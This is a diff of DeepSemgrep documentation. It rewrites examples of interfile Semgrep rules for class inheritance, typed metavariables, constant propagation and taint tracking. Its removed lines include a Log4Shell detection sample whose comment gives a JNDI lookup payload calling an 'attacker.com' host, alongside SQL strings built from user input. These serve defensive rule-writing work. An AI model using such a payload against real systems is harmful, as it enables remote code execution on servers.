@@ -7,11 +7,11 @@ description: "This document provides an overview of DeepSemgrep use cases, such 
 
 ## Introduction
 
-Improve your scan results for entire codebases with interfile coding paradigms using DeepSemgrep instead of Semgrep's regular intrafile (within-a-single-file) approach. In most object-oriented programming styles, it is expected that classes are in different files. DeepSemgrep empowers you to easily scan whole repositories with classes in different files to find vulnerabilities in your code. DeepSemgrep is a proprietary extension of free and open source Semgrep which leverages global analysis tools, and uses the same rules as Semgrep.
+Improve your scan results for entire codebases with interfile coding paradigms using DeepSemgrep instead of Semgrep's regular intrafile (within-a-single-file) approach. In most object-oriented programming styles classes are in different files. DeepSemgrep empowers you to easily scan whole repositories with classes in different files to find vulnerabilities in your code. DeepSemgrep is a proprietary extension of free and open source Semgrep which leverages global analysis tools, and uses the same rules as Semgrep. 
 
-This document demonstrates the utility of DeepSemgrep through use cases, guiding you through examples of Semgrep rules that you can use to search for particular patterns in code. Both Semgrep rules and code on which rules are tested are marked as code snippets and introduced always as a rule, code, or file used to illustrate the capabilities of DeepSemgrep.
+This document demonstrates the utility of DeepSemgrep through use cases, guiding you through examples of Semgrep rules. Both Semgrep rules and code on which rules are tested are marked as code snippets and introduced always as a rule, code, or file used to illustrate the capabilities of DeepSemgrep.
 
-## Obtaining DeepSemgrep
+### Obtaining DeepSemgrep
 
 To get DeepSemgrep, follow these steps:
 1. Submit your email using the [DeepSemgrep beta form](https://semgrep.dev/deep-semgrep-beta).
@@ -21,63 +21,33 @@ To get DeepSemgrep, follow these steps:
     semgrep login
     ```
 4. Follow the link that Semgrep prints to the command-line.
-5. Use the following commands:
+5. To install DeepSemgrep, use the following command:
     ```sh
     semgrep install-deep-semgrep
     ```
-
-    And then:
+6. To test DeepSemgrep, use the following command:
     ```sh
     semgrep --deep --config=myrule.yaml
     ```
 
 Use DeepSemgrep in the command-line with `semgrep --deep`.
 
-## Type inference and class inheritance
+### Cloning DeepSemgrep testing code repository
 
+DeepSemgrep displays its full value with more files. This makes the usual embedded code that you can see in Semgrep examples not useful for demonstrating the capabilities of DeepSemgrep because embedded code from the Semgrep App only displays one rule and one test file at a time.
+
+To learn by doing, use DeepSemgrep while reading this documentation. Follow this document by cloning our [DeepSemgrep testing code repository](https://github.com/returntocorp/deep-semgrep-tests) and test the procedures in the sections below.
+
+## Type inference and class inheritance
 ### Class inheritance
 
-This section compares the possible findings of a scan across multiple files using Semgrep and DeepSemgrep.
+This section compares the possible findings of a scan across multiple files using Semgrep and DeepSemgrep. There is an `app.java` file that includes two check functions that throw exceptions. We are looking for methods that throw a particular exception, `ExampleException`. When using this rule, Semgrep matches code that throws `ExampleException` but not `BadRequest`. 
 
-To scan for methods that throw a particular exception, `ExampleException`, use the following rule:
+<iframe title="Semgrep example no prints"src="https://semgrep.dev/embed/editor?snippet=emjin:throw-exception-example" width="100%" height="432" frameborder="0"></iframe>
 
-```yaml
-rules:
-- id: throw-exception-example
-  pattern: |
-       throw new ExampleException(...);
-  message: Throwing an ExampleException
-  languages: [java]
-  severity: ERROR
-```
+This rule matches code that throws `ExampleException` but not `BadRequest`. Check other files in the `docs/class_inheritance` directory. In the context of all files, you can find that this match does **not** capture the whole picture. The `BadRequest` extends `ExampleException`:
 
-This rule matches code that throws `ExampleException` but not `BadRequest`:
-
-```java
-package example;
-
-public class App {
-    public void check(String s) {
-        if (is_bad(s)) {
-            // rule-id: throw-exception-example
-            throw new ExampleException(s);
-        }
-    }
-
-    public void check2(String s) {
-        if (is_bad(s)) {
-            // ok: throw-exception-example
-            throw new BadRequest(s);
-        }
-    }
-}
-```
-
-Test an interactive example in the [Playground](https://semgrep.dev/s/emjin:throw-exception-example).
-
-Now consider the case where `BadRequest` extends `ExampleException`:
-
-File 1:
+File `example_exception.java`:
 ```java
 package example;
 
@@ -89,7 +59,7 @@ public class ExampleException extends Exception {
 }
 ```
 
-File 2:
+File `bad_request.java`:
 ```java
 package example; 
 
@@ -100,198 +70,52 @@ class BadRequest extends ExampleException {
 }
 ```
 
-It’s now necessary to change the rule to detect instances where `BadRequest` is thrown:
+Where `ExampleException` is thrown, we also want to find `BadRequest`, because `BadRequest` is a child of `ExampleException`. Unlike Semgrep, DeepSemgrep can find `BadRequest`. Since DeepSemgrep uses information from all the files in the directory it scans, it detects `BadRequest` and finds both thrown exceptions.
+ 
+If you are following in the cloned [DeepSemgrep testing repository](https://github.com/returntocorp/deep-semgrep-tests), in the `docs/class_inheritance` directory, try the following commands to test the difference:
 
-```java
-package example;
-
-public class App {
-    public void check(String s) {
-        if (is_bad(s)) {
-            // rule-id: throw-exception-example
-            throw new ExampleException(s);
-        }
-    }
-
-    public void check2(String s) {
-        if (is_bad(s)) {
-            // rule-id: throw-exception-example
-            throw new BadRequest(s);
-        }
-    }
-}
-```
-
-#### Using fully-qualified name in DeepSemgrep
-
-To make the rule more precise, DeepSemgrep allows you to use fully-qualified names. To detect instances where `BadRequest` is thrown, run DeepSemgrep. Considering that the original Semgrep rule is run interfile, to disambiguate `ExampleException` from other exceptions that can have the same name, amend the rule to search for `example.ExampleException`:
-
-Rule:
-```yaml
-rules:
-- id: throw-exception-example
-  pattern: |
-       throw new example.ExampleException(...);
-  message: Throwing an ExampleException
-  languages: [java]
-  severity: ERROR
-```
-
-Now, if you run this rule with DeepSemgrep, both thrown exceptions displayed above are matched!
+1. Run Semgrep:
+    ```sh
+    semgrep --config deep.yaml .
+    ```
+2. Run DeepSemgrep:
+    ```sh
+    semgrep --config deep.yaml . --deep
+    ```
 
 ### Using class inheritance with typed metavariables
 
-To search for variables of a certain class, Semgrep enables you to scan for [typed metavariables](https://semgrep.dev/docs/writing-rules/pattern-syntax/#typed-metavariables) in several languages. The following rule has been written by the Semgrep community to check for vulnerability to the log4j exploit, Log4Shell.
+DeepSemgrep uses interfile class inheritance information when matching [typed metavariables](https://semgrep.dev/docs/writing-rules/pattern-syntax/#typed-metavariables). Continuing the example from the previous section, see the following example file, where we have defined some exceptions and logged them:
 
-Rule:
-```yaml
-rules:
-- id: log4j2_tainted_argument
- patterns:
-   - pattern-either:
-     - pattern: (Logger $LOGGER).$METHOD($ARG);
-     - pattern: (Logger $LOGGER).$METHOD($ARG,...);
-   - pattern-inside: |
-       import org.apache.log4j.$PKG;
-       ...
-   - pattern-not: (Logger $LOGGER).$METHOD("...");
- message: log4j $LOGGER.$METHOD tainted argument
- languages: [java]
- severity: WARNING
+<iframe title="Semgrep example no prints" src="https://semgrep.dev/embed/editor?snippet=returntocorp:log-exception-example1-copy" width="100%" height="432" frameborder="0"></iframe>
+
+The rule searches for any variable of type `ExampleException` being logged. Semgrep is **not** able to find instances of `BadRequest` being logged, unlike DeepSemgrep. Allowing typed metavariables to access information from the entire program enables users to query any variable for its type and use that information in conjunction with the rest of the code resulting in more accurate findings.
+
+:::note
+For a more realistic example where typed metavariables are used, see the following [rule that the Semgrep community wrote](https://semgrep.dev/playground/s/chegg:log4j2_tainted_argument) to find code vulnerable to the log4j vulnerability.
+:::
+
+Try to run DeepSemgrep in cloned [DeepSemgrep testing repository](https://github.com/returntocorp/deep-semgrep-tests). Go to `docs/class_inheritance_with_typed_metavariables` and run the following command:
+
+```sh
+semgrep --config deep.yaml . --deep
 ```
-
-File:
-```java
-import org.apache.log4j.Logger;
-import org.apache.log4j.LogManager;
-import java.io.*;
-import java.sql.SQLException;
-import java.util.*;
- 
- static Logger log;
-  log = LogManager.getLogger(log4jExample.class.getName());
- 
-public class VulnerableLog4jExampleHandler implements HttpHandler {
- 
- 
- /**
-  * A simple HTTP endpoint that reads the request's User Agent and logs it back.
-  * This is pseudo-code to explain the vulnerability, and not a full example.
-  * @param he HTTP Request Object
-  */
- public void handle(HttpExchange he) throws IOException {
-   string userAgent = he.getRequestHeader("user-agent");
-   // ruleid: log4j2_tainted_argument
-   log.info("Request User Agent:" + "" + userAgent);
-   log.info("Request User Agent:" + "");
-   // This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
-   // The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}
-   // ruleid: log4j2_tainted_argument
-   log.info("Request User Agent:" + userAgent);
- 
-   String response = "<h1>Hello There, " + userAgent + "!</h1>";
-   he.sendResponseHeaders(200, response.length());
-   OutputStream os = he.getResponseBody();
-   os.write(response.getBytes());
-   os.close();
- }
-}
- 
-public class main{
-   public static final Logger logger;
- 
-   logger = LogManager.getLogger(someClass.class);
-   public static void someFunc(int arg1, String bad, String somestr){
-     // ruleid: log4j2_tainted_argument
-       logger.error(String.Format("foo biz {}",bad));
-   }
-}
-```
-
-Test an interactive example in the [Playground](https://semgrep.dev/s/chegg:log4j2_tainted_argument).
-
-This rule searches for any function called by an object of type `Logger`, using the restriction within an import for `org.apache.log4j.<ANYTHING>` to make sure that logger is a vulnerable log4j logger.
-
-The log4j rule illustrates the use of typed metavariables in Semgrep. With DeepSemgrep you may achieve higher fidelity findings for the following reasons:
-
-If another class extends the log4j `Logger`, as shown before, DeepSemgrep still detects it. If you have a safe wrapper, you can modify the rule to exclude matches using the safe wrapper class to avoid false positives.
-If the `Logger` object is created by a factory method in another class, DeepSemgrep still detects it.
-
-#### Using fully-qualified name in DeepSemgrep
-
-To make the rule more precise, DeepSemgrep allows you to use fully-qualified names. This also makes the rule a little prettier by eliminating the `pattern-inside`!
-
-Rule:
-```yaml
-rules:
-- id: log4j2_tainted_argument
-  patterns:
-    - pattern-either:
-      - pattern: (org.apache.log4j.Logger $LOGGER).$METHOD($ARG);
-      - pattern: (org.apache.log4j.Logger $LOGGER).$METHOD($ARG,...);
-    - pattern-not: (org.apache.log4j.Logger $LOGGER).$METHOD("...");
-  message: log4j $LOGGER.$METHOD tainted argument
-  languages: [java]
-  severity: WARNING
-```
-
-With DeepSegremp, this rule finds the use of any instance of log4j’s `Logger` class.
-
-Allowing typed metavariables to access information from the entire program enables users to query any variable for its type and use that information in conjunction with the rest of the code resulting in more accurate findings.
 
 ## Constant propagation
 
 ### Finding dangerous calls
 
-[Constant propagation](https://semgrep.dev/docs/writing-rules/data-flow/constant-propagation/) provides a syntax for eliminating false positives in Semgrep rules. Even if a variable is set to a constant before being used in a function call several lines below, Semgrep knows that it must have that value and matches the function call. DeepSemgrep does not use the dataflow engine for constant propagation. For more information, see [Pattern Syntax](https://semgrep.dev/docs/writing-rules/pattern-syntax/#constants)
+[Constant propagation](https://semgrep.dev/docs/writing-rules/pattern-syntax/#constants) provides a syntax for eliminating false positives in Semgrep rules. Even if a variable is set to a constant before being used in a function call several lines below, Semgrep knows that it must have that value and matches the function call. For example, this rule looks for non-constant values passed to the `dangerous` function:
 
-For example, this rule looks for non-constant values passed to the `dangerous` function:
+<iframe title="Semgrep example no prints" src="https://semgrep.dev/embed/editor?snippet=emjin:dangerous-call" width="100%" height="432" frameborder="0"></iframe>
 
-Rule:
-```yaml
-rules:
-- id: dangerous-call
-  patterns:
-    - pattern: dangerous(...)
-    - pattern-not: dangerous("...")
-  message: Call of dangerous on non-constant value
-  languages: [java]
-  severity: WARNING
-```
+Semgrep matches the first and second calls because Semgrep cannot find a constant value for either `user_input` or `EMPLOYEE_TABLE_NAME`.
 
-File:
-```java
-package com.example;
-import com.main.Constants.EMPLOYEE_TABLE_NAME;
-
-public class App {
-
-    public void example(String user_input) {
-
-        // rule-id: dangerous-call
-        dangerous("Select * FROM " + user_input);
-
-        // rule-id: dangerous-call
-        dangerous("Select * FROM " + EMPLOYEE_TABLE_NAME);
-        
-        String table_name = "Employees";
-        // ok:        
-        dangerous("Select * FROM " + table_name);
-
-        // ok:
-        dangerous("Select * FROM Employees");
-    }
-
-}
-```
-
-Test an interactive example in the [Playground](https://semgrep.dev/s/emjin:dangerous-call).
-
-This matches the first and second calls because Semgrep does not understand a constant value for either `user_input` or `EMPLOYEE_TABLE_NAME`. However, `EMPLOYEE_TABLE_NAME` is imported from a global constants file with the following content.
+Now, let's make the example a bit more complicated to illustrate what DeepSemgrep can do. If the `EMPLOYEE_TABLE_NAME` is imported from a global constants file with the following content:
 
 Global constants file:
 ```java
-package example;
+package com.main;
 
 public final class Constants {
     public static final double PI = 3.14159;
@@ -300,114 +124,52 @@ public final class Constants {
 }
 ```
 
-You do not need any changes to this rule in DeepSemgrep, and it matches only the first call.
+DeepSemgrep matches the first call without any change to the rule.
 
+Try to run DeepSemgrep in cloned [DeepSemgrep testing repository](https://github.com/returntocorp/deep-semgrep-tests). Go to `docs/constant_propagation_dangerous_calls` and run the following command:
+
+```sh
+semgrep --config deep.yaml . --deep
+```
 ### Propagating values
 
-In this example, the string was constant, expressed with `”...”`, but constant propagation also propagates the constant value. We changed the previous rule to search for calls to `dangerous("Select * FROM Employees");`
+In the previous example, we only cared whether the string was constant or not, so we used `”...”`, but constant propagation also propagates the constant value. To illustrate the use of DeepSemgrep with constant propagation, the rule from the previous section is changed to search for calls to `dangerous("Employees");`.
 
-```yaml
-rules:
-- id: dangerous-call-to-employees
-  patterns:
-    - pattern: dangerous("Select * FROM Employees")
-  message: Call of dangerous on employees table
-  languages: [java]
-  severity: WARNING
-```
+<iframe title="Semgrep example no prints" src="https://semgrep.dev/embed/editor?snippet=adamkvitek:propagating-values" width="100%" height="432" frameborder="0"></iframe>
 
 With DeepSemgrep, this rule matches the last three calls to `dangerous`, since these calls are selected from the `Employees` table, though each one obtains the table name differently:
 
-```java
-package com.example;
-import com.main.Constants.EMPLOYEE_TABLE_NAME;
+Try to run DeepSemgrep in cloned [DeepSemgrep testing repository](https://github.com/returntocorp/deep-semgrep-tests). Go to `docs/constant_propagation_propagating_values` and run the following command:
 
-public class App {
-
-    public void example(String user_input) {
-
-        // ok:
-        dangerous("Select * FROM " + user_input);
-
-        // rule-id: dangerous-call-to-employees
-        dangerous("Select * FROM " + EMPLOYEE_TABLE_NAME);
-        
-        String table_name = "Employees";
-        // rule-id: dangerous-call-to-employees   
-        dangerous("Select * FROM " + table_name);
-
-        // rule-id: dangerous-call-to-employees
-        dangerous("Select * FROM Employees");
-    }
-
-}
+```sh
+semgrep --config deep.yaml . --deep
 ```
 
 ## Taint tracking
 
-Constant versus non-constant is not the only distinction to be made about a value. Semgrep allows you to search for the flow of any potentially exploitable input into an important sink using taint mode. For more information, see [taint mode](https://semgrep.dev/docs/writing-rules/data-flow/taint-mode/) documentation.
+Semgrep allows you to search for the flow of any potentially exploitable input into an important sink using taint mode. For more information, see [taint mode](https://semgrep.dev/docs/writing-rules/data-flow/taint-mode/) documentation.
 
-To continue with the previous example, look for dangerous calls using data obtained by calling `get_user_input`. The rule does this by specifying the source of taint as `get_user_input(...)` and the sink as `dangerous(...);`.
+To continue with the previous example, we have modified our previous files a bit. Semgrep is searching for dangerous calls using data obtained by calling `get_user_input`. The rule does this by specifying the source of taint as `get_user_input(...)` and the sink as `dangerous(...);`.
 
-Rule:
-```yaml
-rules:
-- id: dangerous-taint
- mode: taint
- pattern-sources:
-   - pattern: get_user_input(...);
- pattern-sinks:
-   - pattern: dangerous(...);
- message: Call of dangerous on tainted value
- languages: [java]
- severity: WARNING
+<iframe title="Semgrep example no prints" src="https://semgrep.dev/embed/editor?snippet=emjin:dangerous-taint" width="100%" height="432" frameborder="0"></iframe>
+
+Here, Semgrep matches `dangerous(“Select * from “ + user_input`), because `user_input` is obtained by calling `get_user_input`. However, it does not match the similar call using `still_user_input`, because its analysis does not cross function boundaries to know that `still_user_input` is a wrapper function for `user_input`.
+
+DeepSemgrep matches both dangerous calls, because it does cross function boundaries. In fact, with DeepSemgrep, the taint rule can track calls to `get_user_input` over multiple jumps in multiple files. 
+
+Try to run DeepSemgrep in cloned [DeepSemgrep testing repository](https://github.com/returntocorp/deep-semgrep-tests). Go to `docs/taint_tracking` and run the following command:
+
+```sh
+semgrep --config deep.yaml . --deep
 ```
-
-Modify our previous file a bit.
-
-File:
-```java
-package com.example;
- 
-public class App {
- 
-   public void read_input() {
-       return trim(get_user_input("example"));
-   }
- 
-   public void example(String safe_input) {
-       String user_input = get_user_input("example");
-       String still_user_input = read_input();
- 
-       // rule-id: dangerous-call
-       dangerous("Select * FROM " + user_input);
- 
-       // rule-id: dangerous-call
-       dangerous("Select * FROM " + still_user_input);
- 
-       // ok:       
-       dangerous("Select * FROM " + safe_input);
-   }
- 
-}
-```
-
-Test the example in the [Playground](https://semgrep.dev/s/emjin:dangerous-taint).
-
-Comparing DeepSemgrep to Semgrep, Semgrep can be misled in this example. If `read_input` was in another file, it would be impossible for Semgrep to know that `read_input` had called `get_user_input`. Of course, the rule could include `read_input` as another source, but if wrappers are being written frequently this might not be a good approach.
-
-With DeepSemgrep, the taint rule can track calls to `get_user_input` over multiple jumps in multiple files. It can also handle more complicated situations with sources and sinks. Since DeepSemgrep rules are just Semgrep rules, the normal taint documentation is a good explanation of those.
-
 ## Appendix
 
 ### Difference between DeepSemgrep and join mode
 
 DeepSemgrep is different from [join mode](https://semgrep.dev/docs/experiments/join-mode/overview/), which also allows you to perform interfile analyses by letting you join on the metavariable matches in separate rules.
-
 ### Future development of DeepSemgrep
 
 We’re excited to hear what’s on your mind. As users explore the limits of DeepSemgrep, we want to know what they’re failing to express. We believe that interfile type inference, constant propagation, and taint tracking combined allow users to express most restrictions on a program and enforce them quickly.
-
 ### Supported languages
 
-DeepSemgrep now supports Java and Ruby.
+DeepSemgrep now offers beta support for Java and Ruby.
